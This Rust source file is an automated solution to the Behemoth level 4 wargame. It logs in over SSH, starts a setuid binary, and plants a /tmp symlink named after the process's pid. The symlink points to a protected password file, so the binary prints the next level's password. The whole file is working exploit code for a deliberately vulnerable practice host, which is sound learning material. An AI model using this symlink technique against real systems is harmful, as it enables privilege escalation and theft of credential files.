use crate::util::*;
use anyhow::Result;

/// behemoth4 attempts to read a file in tmp with the name of its pid
/// the code from ghidra is a bit like:
///   _Var1 = getpid();
///   sprintf(local_28,"/tmp/%d",_Var1);
///   __stream = fopen(local_28,"r");
///   if (__stream == (FILE *)0x0) {
///       puts("PID not found!");
///   }
///   else {
///       sleep(1);
///       puts("Finished sleeping, fgetcing");
///       while( true ) {
///       __c = fgetc(__stream);
///       if (__c == -1) break;
///       putchar(__c);
///       }
///       fclose(__stream);
///   }
/// technique is to start the process, get its pid, and in parellel create a link to the next password file to be read
pub fn solve(password: &str) -> Result<String> {
    let session = ssh_session(super::HOST, super::PORT, "behemoth4", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth4@gibson:~$ ")?;

    println!("creating a tmp folder and moving to it");
    write_line(&mut channel, "cd $(mktemp -d)")?;
    read_until(&mut channel, "$ ")?;

    println!("starting process in background");
    write_line(
        &mut channel,
        "bash -c 'echo $$ > test.pid && sleep 2 && exec /behemoth/behemoth4 > res.txt' &",
    )?;
    read_until(&mut channel, "$ ")?;

    println!("creating symlink");
    write_line(
        &mut channel,
        "ln -s /etc/behemoth_pass/behemoth5 /tmp/$(cat test.pid)",
    )?;
    read_until(&mut channel, "$ ")?;

    println!("waiting for result");
    std::thread::sleep(std::time::Duration::from_secs(3));

    write_line(&mut channel, "cat res.txt")?;
    let result = read_until(&mut channel, "$ ")?;
    let result = result
        .split("\n")
        .map(|s| s.trim())
        .find(|s| s.len() == 10)
        .unwrap();
    println!("retrieved behemoth5 pass '{result}'\n");

    Ok(result.to_string())
}
